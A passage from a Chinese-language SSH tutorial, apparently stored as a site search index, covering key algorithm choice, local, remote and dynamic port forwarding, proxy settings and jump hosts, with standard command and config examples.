\u200b\u9009\u9879\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Host example\n  IdentityFile ~/.ssh/id_rsa\n  #CertificateFile ~/.ssh/id_rsa-cert.pub\n</code></pre> <p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u9664\u975e\u200b\u4e3a\u4e86\u200b\u517c\u5bb9\u200b\u4e00\u4e9b\u200b\u975e\u5e38\u200b\u53e4\u8001\u200b\uff08\u200b\u5982\u200b 10 \u200b\u5e74\u524d\u200b\u7684\u200b\uff09\u200b\u6216\u200b\u975e\u5e38\u7b80\u5355\u200b\u7684\u200b\uff08\u200b\u5982\u200b\u5d4c\u5165\u5f0f\u200b\uff09\u200b\u7cfb\u7edf\u200b\u800c\u200b\u4e0d\u5f97\u4e0d\u200b\u4f7f\u7528\u200b\u8f83\u200b\u77ed\u200b\u7684\u200b RSA \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b Ed25519 \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\uff0c\u200b\u6216\u8005\u200b ECDSA \u200b\u5bc6\u94a5\u200b\u5bf9\u200b\u3002\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u57fa\u4e8e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u5bc6\u7801\u5b66\u200b\u7b97\u6cd5\u200b\u6bd4\u200b RSA \u200b\u66f4\u200b\u5b89\u5168\u200b\uff0c\u200b\u800c\u4e14\u200b\u6027\u80fd\u200b\u4e5f\u200b\u66f4\u597d\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u5f97\u4e0d\u200b\u4f7f\u7528\u200b RSA \u200b\u7684\u8bdd\u200b\uff0c\u200b\u8bf7\u200b\u5c3d\u53ef\u80fd\u200b\u4f7f\u7528\u200b 3072 \u200b\u4f4d\u200b\u6216\u200b\u66f4\u957f\u200b\u7684\u200b\u5bc6\u94a5\u200b\u957f\u5ea6\u200b\u3002\u200b\u5bc6\u94a5\u200b\u957f\u5ea6\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4f7f\u7528\u200b <code>ssh-keygen</code> \u200b\u751f\u6210\u200b\u5bc6\u94a5\u200b\u5bf9\u65f6\u200b\u6307\u5b9a\u200b\uff08<code>-b</code>\uff09\uff0c\u200b\u5176\u4e2d\u200b\u4e0d\u540c\u200b\u7b97\u6cd5\u200b\u652f\u6301\u200b\u4e0e\u200b\u63a8\u8350\u200b\u7684\u200b\u957f\u5ea6\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\uff1a</p> \u200b\u7b97\u6cd5\u200b \u200b\u652f\u6301\u200b\u957f\u5ea6\u200b \u200b\u63a8\u8350\u200b\u957f\u5ea6\u200b \u200b\u8bf4\u660e\u200b RSA 1024-4096 3072 \u200b\u6216\u200b\u4ee5\u4e0a\u200b \u200b\u66fe\u7ecf\u200b\u7684\u200b\u63a8\u8350\u200b\u957f\u5ea6\u200b\u662f\u200b 2048 \u200b\u4f4d\u200b\uff0c\u200b\u4f46\u200b 2020 \u200b\u5e74\u200b\u4ee5\u540e\u200b\u8ba4\u4e3a\u200b\u8fd9\u4e2a\u200b\u957f\u5ea6\u200b\u5df2\u200b\u4e0d\u591f\u200b\u5b89\u5168\u200b ECDSA 256 / 384 / 521 256 / 384 / 521 \u200b\u7531\u4e8e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u53c2\u6570\u200b\u9009\u62e9\u200b\u7684\u200b\u7279\u6b8a\u6027\u200b\uff0c\u200b\u53ea\u6709\u200b\u8fd9\u200b\u4e09\u79cd\u200b\u957f\u5ea6\u200b\u53ef\u200b\u9009\u200b\u3002\u200b\u6ce8\u610f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u9009\u9879\u200b\u662f\u200b 521\uff0c\u200b\u4e0d\u662f\u200b 512 Ed25519 - - Ed25519 \u200b\u662f\u200b\u57fa\u4e8e\u200b Edwards \u200b\u66f2\u7ebf\u200b\u7684\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u6ca1\u6709\u200b\u201c\u200b\u957f\u5ea6\u200b\u201d\u200b\u8fd9\u79cd\u200b\u53c2\u6570\u200b <p>\u200b\u53e6\u5916\u200b\uff0c\u200b\u8f83\u200b\u65e9\u200b\u7248\u672c\u200b\u7684\u200b SSH \u200b\u8fd8\u6709\u200b DSA \u200b\u7b97\u6cd5\u200b\uff08\u200b\u516c\u94a5\u200b\u4ee5\u200b <code>ssh-dss</code> \u200b\u5f00\u5934\u200b\uff09\uff0c\u200b\u5b83\u200b\u4ec5\u200b\u6709\u200b 1024 \u200b\u4f4d\u200b\u4e00\u79cd\u200b\u957f\u5ea6\u200b\uff0c\u200b\u5b89\u5168\u6027\u200b\u6bd4\u200b RSA \u200b\u8fd8\u200b\u5dee\u200b\u3002\u200b\u56e0\u6b64\u200b OpenSSH 7.0 \u200b\u5f00\u59cb\u200b\u9ed8\u8ba4\u200b\u4e0d\u518d\u200b\u751f\u6210\u200b\u6216\u200b\u4f7f\u7528\u200b DSA \u200b\u5bc6\u94a5\u200b\uff0cOpenSSH 9.8 \u200b\u5f00\u59cb\u200b\u5728\u200b\u7f16\u8bd1\u200b\u671f\u200b\u7981\u7528\u200b DSA \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u5f88\u5feb\u200b\u4ece\u200b\u4ee3\u7801\u200b\u5e93\u4e2d\u200b\u5b8c\u5168\u200b\u79fb\u9664\u200b DSA \u200b\u76f8\u5173\u200b\u4ee3\u7801\u200b\u3002</p>"},{"location":"dev/ssh/#port-forwarding","title":"\u7aef\u53e3\u200b\u8f6c\u53d1","text":"<p>SSH \u200b\u914d\u7f6e\u200b TCP \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u7684\u200b\u683c\u5f0f\u200b\u4e3a\u200b <code>[bind_address:]port:host:hostport</code>\uff0cSSH \u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff1a</p>"},{"location":"dev/ssh/#local-port-forwarding","title":"\u672c\u5730\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff08Local port forwarding\uff09","text":"<p>\u200b\u5728\u200b\u672c\u5730\u200b\u4e0a\u200b\u76d1\u542c\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\uff0c\u200b\u5c06\u200b\u6536\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\u3002\u200b\u5373\u5c06\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u67d0\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u5230\u200b\u672c\u5730\u200b\uff0c\u200b\u4f7f\u200b\u672c\u5730\u200b\u7684\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b SSH \u200b\u8bbf\u95ee\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u4f8b\u5982\u200b\u5c06\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b 80 \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b 8080\uff1a</p> <pre><code>ssh -L 8080:localhost:80 example\n</code></pre> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u6240\u5728\u200b\u7f51\u7edc\u200b\u7684\u200b\u673a\u5668\u200b\u901a\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u8f6c\u53d1\u200b\uff0c\u200b\u5047\u8bbe\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7f51\u7edc\u200b\u5185\u90e8\u200b\u7684\u200b\u673a\u5668\u200b\u540d\u53eb\u200b <code>internalserver</code>\uff1a</p> <pre><code>ssh -L 8080:internalserver:80 example\n</code></pre> <p>\u200b\u672c\u5730\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u9ed8\u8ba4\u200b\u76d1\u542c\u200b\u5728\u200b localhost\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u76d1\u542c\u200b\u5176\u4ed6\u200b\u5730\u5740\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u9700\u8981\u200b\u76d1\u542c\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>ssh -L 0.0.0.0:8080:localhost:80 example\n</code></pre> <p>\u200b\u867d\u7136\u200b SSH \u200b\u5ba2\u6237\u7aef\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e2a\u200b <code>GatewayPorts</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u53ea\u200b\u5f71\u54cd\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b\u76d1\u542c\u200b\u5730\u5740\u200b\u7684\u200b\u8bed\u6cd5\u200b\u6a21\u5f0f\u200b\uff08\u200b\u5373\u200b\u4e09\u6bb5\u5f0f\u200b <code>localport:remotehost:remoteport</code>\uff09\u3002\u200b\u6307\u5b9a\u200b\u56db\u6bb5\u200b\u5f0f\u200b\u8bed\u6cd5\u200b\u540e\u200b\uff0c<code>GatewayPorts</code> \u200b\u9009\u9879\u200b\u4e0d\u518d\u200b\u8d77\u200b\u4f5c\u7528\u200b\u3002</p>"},{"location":"dev/ssh/#remote-port-forwarding","title":"\u8fdc\u7a0b\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff08Remote port forwarding\uff09","text":"<p>\u200b\u5728\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u76d1\u542c\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\uff0c\u200b\u5c06\u200b\u6536\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\u3002\u200b\u5373\u5c06\u200b\u672c\u5730\u200b\u67d0\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\uff0c\u200b\u4f7f\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b SSH \u200b\u8bbf\u95ee\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u4f8b\u5982\u200b\u5c06\u200b\u672c\u5730\u200b\u4e3b\u673a\u200b\u7684\u200b 80 \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b 8080 \u200b\u7aef\u53e3\u200b\uff1a</p> <pre><code>ssh -R 8080:localhost:80 example\n</code></pre> <p>\u200b\u4e0a\u9762\u200b\u547d\u4ee4\u200b\u8868\u793a\u200b\u5728\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b example \u200b\u4e0a\u200b\u76d1\u542c\u200b 8080 \u200b\u7aef\u53e3\u200b\uff0c\u200b\u5c06\u200b\u6536\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b 80 \u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u540c\u6837\u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u672c\u5730\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u673a\u5668\u200b\u505a\u200b\u8f6c\u53d1\u200b\uff0c\u200b\u5047\u8bbe\u200b\u5bf9\u5e94\u200b\u673a\u5668\u200b\u540d\u4e3a\u200b <code>myinternalserver</code>\uff1a</p> <pre><code>ssh -R 8080:myinternalserver:80 example\n</code></pre> <p>\u200b\u6ce8\u610f\u200b\u8fdc\u7a0b\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u9ed8\u8ba4\u200b\u53ea\u80fd\u200b\u76d1\u542c\u200b localhost\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u76d1\u542c\u200b\u5176\u4ed6\u200b\u5730\u5740\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b <code>sshd_config</code> \u200b\u4e2d\u200b\u8bbe\u7f6e\u200b <code>GatewayPorts yes</code>\u3002\u200b\u4e0e\u200b\u53e6\u5916\u200b\u4e24\u79cd\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u65e0\u6cd5\u200b\u8986\u76d6\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b <code>GatewayPorts</code> \u200b\u8bbe\u5b9a\u200b\u3002</p> <p>\u200b\u5728\u200b OpenSSH 7.6 \u200b\u7248\u672c\u200b\u4e4b\u540e\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\uff0c<code>-R</code> \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u8ba9\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u5229\u7528\u200b\u672c\u5730\u200b\u4f5c\u4e3a\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\uff08\u200b\u76f8\u5f53\u4e8e\u200b\u4e0b\u9762\u200b\u7684\u200b <code>-D</code> \u200b\u53c2\u6570\u200b\u53cd\u8fc7\u6765\u200b\uff09\uff0c\u200b\u5bf9\u5e94\u200b\u624b\u518c\u200b\u4e2d\u200b\u7684\u200b <code>-R [bind_address:]port</code> \u200b\u90e8\u5206\u200b\uff1a</p> <pre><code>ssh -R 1080 example\n# \u200b\u6307\u5b9a\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b\u76d1\u542c\u200b\u5730\u5740\u200b\nssh -R 127.0.0.1:1080 example\n</code></pre>"},{"location":"dev/ssh/#dynamic-port-forwarding","title":"\u52a8\u6001\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff08Dynamic port forwarding\uff09","text":"<p>\u200b\u5728\u200b\u672c\u5730\u200b\u76d1\u542c\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\u7528\u4f5c\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\uff0c\u200b\u5c06\u200b\u6536\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u5229\u7528\u200b\u4e86\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4f5c\u4e3a\u200b\u4ee3\u7406\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>ssh -D 1080 example\n</code></pre> <p>\u200b\u7531\u4e8e\u200b SOCKS \u200b\u4ee3\u7406\u200b\u662f\u200b\u4e00\u4e2a\u200b\u901a\u7528\u200b\u7684\u200b\u4ee3\u7406\u200b\u534f\u8bae\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u4efb\u4f55\u200b TCP \u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e0d\u4ec5\u4ec5\u200b\u662f\u200b HTTP\u3002</p> <p>\u200b\u4e0e\u200b LocalForward \u200b\u7c7b\u4f3c\u200b\uff0cDynamicForward \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u76d1\u542c\u200b\u5730\u5740\u200b\uff1a</p> <pre><code>ssh -D 0.0.0.0:1080 example\n</code></pre> <p>\u200b\u540c\u6837\u200b\u5730\u200b\uff0c<code>GatewayPorts</code> \u200b\u53ea\u200b\u5f71\u54cd\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b\u76d1\u542c\u200b\u5730\u5740\u200b\u7684\u200b\u8bed\u6cd5\u200b\u6a21\u5f0f\u200b\uff08\u200b\u5373\u200b\u53ea\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\uff09\u3002\u200b\u6307\u5b9a\u200b\u76d1\u542c\u200b\u5730\u5740\u200b\u540e\u200b\uff0c<code>GatewayPorts</code> \u200b\u9009\u9879\u200b\u4e0d\u518d\u200b\u8d77\u200b\u4f5c\u7528\u200b\u3002</p>"},{"location":"dev/ssh/#port-forwarding-in-config","title":"\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u8fdb\u884c\u200b\u7aef\u53e3\u200b\u8f6c\u53d1","text":"<p>\u200b\u4ee5\u4e0a\u200b\u4e09\u79cd\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u6307\u5b9a\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Host example\n  LocalForward 8080 localhost:80\n  LocalForward 8081 localhost:8081\n  RemoteForward 8080 localhost:80\n  RemoteForward 8081 localhost:8081\n  DynamicForward 1080\n  DynamicForward 1081\n</code></pre> <p><code>-L</code>\u3001<code>-R</code>\u3001<code>-D</code> \u200b\u548c\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u9009\u9879\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u591a\u6b21\u200b\u51fa\u73b0\u200b\uff0c\u200b\u6307\u5b9a\u200b\u591a\u6761\u200b\u8f6c\u53d1\u200b\u89c4\u5219\u200b\uff0c\u200b\u5b83\u4eec\u200b\u4e92\u76f8\u200b\u72ec\u7acb\u200b\u3001\u200b\u4e0d\u4f1a\u200b\u8986\u76d6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u91cd\u590d\u200b\u6307\u5b9a\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u7aef\u53e3\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\u3002</p> <p>\u200b\u672c\u5730\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u548c\u200b\u8fdc\u7a0b\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6a21\u5f0f\u200b\u53ef\u4ee5\u200b\u7ed3\u5408\u200b\u7531\u200b Ivan Velichko \u200b\u7ed8\u5236\u200b\u7684\u200b\u56fe\u7247\u200b\u6765\u200b\u7406\u89e3\u200b\uff1a</p> <p></p> <p>\u200b\u4ee3\u7406\u200b\u4e0e\u200b\u73af\u5883\u53d8\u91cf\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u5404\u79cd\u5404\u6837\u200b\u7684\u200b\u539f\u56e0\u200b\uff0c\u200b\u76ee\u524d\u200b\u5404\u79cd\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5bf9\u200b\u4ee3\u7406\u200b\u76f8\u5173\u200b\u7684\u200b\u73af\u5883\u53d8\u91cf\u200b\uff08<code>http_proxy</code>\u3001<code>https_proxy</code>\u3001<code>all_proxy</code>\u3001<code>no_proxy</code>\uff09\u200b\u7684\u200b\u652f\u6301\u200b\u7a0b\u5ea6\u200b\u5dee\u5f02\u200b\u5f88\u5927\u200b\uff1a</p> <ul> <li><code>http_proxy</code> \u200b\u548c\u200b <code>https_proxy</code> \u200b\u5206\u522b\u200b\u7528\u4e8e\u200b\u8fde\u63a5\u200b\u5230\u200b HTTP \u200b\u548c\u200b HTTPS \u200b\u670d\u52a1\u5668\u65f6\u200b\u7684\u200b\u4ee3\u7406\u200b\u8bbe\u7f6e\u200b\u3002\u200b\u6ce8\u610f\u200b\u8fd9\u200b\u548c\u200b\u4ee3\u7406\u200b\u672c\u8eab\u200b\u7684\u200b\u534f\u8bae\u200b\u65e0\u5173\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u539f\u56e0\u200b\u662f\u200b HTTP \u200b\u662f\u200b\u660e\u6587\u200b\u534f\u8bae\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u4ee3\u7406\u670d\u52a1\u5668\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b HTTP \u200b\u8bf7\u6c42\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u6216\u8005\u200b\u505a\u200b\u7f13\u5b58\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4f46\u662f\u200b HTTPS \u200b\u5c31\u200b\u4e0d\u884c\u200b\u4e86\u200b\u3002</li> <li>\u200b\u73af\u5883\u53d8\u91cf\u200b\u662f\u200b\u5927\u5c0f\u5199\u200b\u654f\u611f\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5bf9\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>HTTP_PROXY</code> \u200b\u548c\u200b <code>http_proxy</code> \u200b\u662f\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\u3002\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u90fd\u200b\u652f\u6301\u200b\u5c0f\u5199\u200b\u7684\u200b\u4ee3\u7406\u200b\u73af\u5883\u53d8\u91cf\u200b\uff0c\u200b\u4f46\u662f\u200b\u5927\u5199\u200b\u7684\u200b\u4ee3\u7406\u200b\u73af\u5883\u53d8\u91cf\u200b\u652f\u6301\u200b\u60c5\u51b5\u200b\u5c31\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u4e86\u200b\uff0c\u200b\u56e0\u6b64\u200b\u63a8\u8350\u200b\u53ea\u200b\u8bbe\u7f6e\u200b\u5c0f\u5199\u200b\u7684\u200b\u4ee3\u7406\u200b\u73af\u5883\u53d8\u91cf\u200b\u3002</li> <li>\u200b\u4e0d\u662f\u200b\u6240\u6709\u200b\u7a0b\u5e8f\u200b\u90fd\u200b\u652f\u6301\u200b\u8bbe\u7f6e\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\u3002curl \u200b\u652f\u6301\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\uff08<code>socks5://</code> \u200b\u548c\u200b <code>socks5h://</code>\uff09\uff0c\u200b\u5176\u4e2d\u200b\u5e26\u200b <code>h</code> \u200b\u7684\u200b\u540e\u8005\u200b\u4ee3\u8868\u200b\u7531\u200b\u4ee3\u7406\u200b\uff08\u200b\u800c\u200b\u4e0d\u662f\u200b\u672c\u200b\u673a\u200b\uff09\u200b\u89e3\u6790\u200b\u4e3b\u673a\u540d\u200b\u3002</li> </ul> <p>\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\u53ef\u200b\u53c2\u8003\u200b\uff1aWe need to talk: Can we standardize NO_PROXY?\u3002</p>"},{"location":"dev/ssh/#proxy","title":"\u4f7f\u7528\u200b\u4ee3\u7406","text":"<p>SSH \u200b\u652f\u6301\u200b\u81ea\u5b9a\u4e49\u200b\u4ee3\u7406\u200b\u547d\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4ee3\u7406\u670d\u52a1\u5668\u200b\u8fde\u63a5\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u3002 \u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u7528\u6cd5\u200b\u662f\u200b\u901a\u8fc7\u200b SOCKS5 \u200b\u4ee3\u7406\u200b\u8fde\u63a5\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u501f\u52a9\u200b <code>nc</code> \u200b\u547d\u4ee4\u200b\u5b9e\u73b0\u200b<sup>1</sup>\uff1a</p> <pre><code>Host example\n  ProxyCommand nc -X 5 -x proxy.example.com:1080 %h %p\n</code></pre> <p>\u200b\u8ba9\u200b\u670d\u52a1\u5668\u200b\u7684\u200b <code>git</code> \u200b\u4f7f\u7528\u200b\u672c\u200b\u673a\u200b\u4f5c\u4e3a\u200b\u4ee3\u7406\u200b</p> <p>\u200b\u5728\u200b\u8bbf\u95ee\u200b SSH remote \u200b\u65f6\u200b\uff0c<code>git</code> \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b <code>GIT_SSH_COMMAND</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u6307\u5b9a\u200b\u7684\u200b SSH \u200b\u547d\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>GIT_SSH_COMMAND=\"ssh -i .git/id_rsa\" git ...</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b <code>git</code> \u200b\u4f7f\u7528\u200b\u6307\u5b9a\u200b\u7684\u200b\u8def\u5f84\u200b\u7684\u200b\u5bc6\u94a5\u200b\u3002</p> <p>\u200b\u800c\u200b\u5728\u200b\u8bbf\u95ee\u200b HTTP(S) remote \u200b\u65f6\u200b\uff0c<code>git</code> \u200b\u4f1a\u200b\u4f7f\u7528\u200b libcurl\uff0c\u200b\u56e0\u6b64\u200b\u4f1a\u200b\u8bfb\u53d6\u200b <code>http_proxy</code>\u3001<code>https_proxy</code> \u200b\u548c\u200b <code>all_proxy</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u6307\u5b9a\u200b\u7684\u200b\u4ee3\u7406\u200b\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>http.proxy</code> \u200b\u8fd9\u4e2a\u200b <code>git config</code> \u200b\u9009\u9879\u200b\u6765\u200b\u6307\u5b9a\u200b\u3002</p> <p>\u200b\u7ed3\u5408\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u548c\u200b\u4ee3\u7406\u200b\u90e8\u5206\u200b\u7ed9\u51fa\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u8ba9\u200b SSH \u200b\u8fde\u63a5\u200b\u5230\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u7684\u200b <code>git</code> \u200b\u4e34\u65f6\u200b\u5229\u7528\u200b\u672c\u200b\u673a\u200b\u4f5c\u4e3a\u200b\u4ee3\u7406\u200b\u8fde\u63a5\u200b SSH \u200b\u548c\u200b HTTP(S) remote\uff0c\u200b\u90a3\u4e48\u200b\u5e94\u8be5\u200b\u5982\u4f55\u200b\u64cd\u4f5c\u200b\uff1f</p>"},{"location":"dev/ssh/#jump-host","title":"\u8df3\u677f","text":"<p>SSH \u200b\u652f\u6301\u200b\u901a\u8fc7\u200b\u8df3\u677f\u200b\u673a\u200b\u8fde\u63a5\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\uff0c\u200b\u5373\u5148\u200b SSH \u200b\u767b\u5f55\u200b jump-host\uff0c\u200b\u518d\u200b\u4ece\u200b jump-host \u200b\u767b\u5f55\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u3002\u200b\u4e00\u4e9b\u200b\u53d7\u9650\u200b\u7684\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u5e38\u5e38\u200b\u91c7\u7528\u200b\u8fd9\u79cd\u200b\u65b9\u6848\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u96c6\u7fa4\u200b\u5185\u200b\u53ea\u6709\u200b\u8df3\u677f\u200b\u673a\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u200b\u7f51\u4e0a\u200b\uff0c\u200b\u800c\u200b\u5176\u4ed6\u200b\u4e3b\u673a\u200b\u90fd\u200b\u5728\u200b\u88ab\u200b\u9694\u79bb\u200b\u7684\u200b\u5185\u200b\u7f51\u4e2d\u200b\uff0c\u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u8df3\u677f\u200b\u673a\u200b\u8bbf\u95ee\u200b\u3002</p> <p><code>ssh</code> \u200b\u547d\u4ee4\u200b\u7684\u200b <code>-J</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u8df3\u677f\u200b\u673a\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>ssh -J user@jumphost.example.com user@realhost.example.com\n</code></pre> <p>\u200b\u5bf9\u5e94\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u8bed\u53e5\u200b\u662f\u200b <code>ProxyJump user@jumphost.example.com</code>\u3002</p> 